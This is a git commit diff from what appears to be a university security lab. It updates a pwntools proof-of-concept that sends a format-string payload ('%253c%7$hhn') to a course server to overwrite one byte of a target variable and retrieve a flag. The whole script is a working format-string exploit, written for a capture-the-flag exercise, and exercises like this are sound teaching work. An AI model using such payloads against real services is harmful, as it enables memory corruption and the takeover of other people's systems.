cf86c18853c2768fed9e60979bb4cb6361d379d6
Tiago Santos <tiago.castro.santos@tecnico.ulisboa.pt>
2026-01-05 20:31:40 +0000

    Added solution for problem 5 lab7

--- lab7/write_specific_byte_poc.py
+++ lab7/write_specific_byte_poc.py
@@ -1,13 +1,13 @@
 from pwn import *
 
-elf = ELF('04_match_value')
+elf = ELF('05_write_specific_byte')
 target_address = elf.symbols['target']
 
 SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
-PORT = 25194
+PORT = 25195
 
 s = remote(SERVER, PORT, timeout=9999)
 
-s.sendline(p32(target_address) + b'%322x.%7$n')
+s.sendline(p32(target_address + 3) + b'.%253c%7$hhn')
 flag = s.recv(512)
 print(flag)
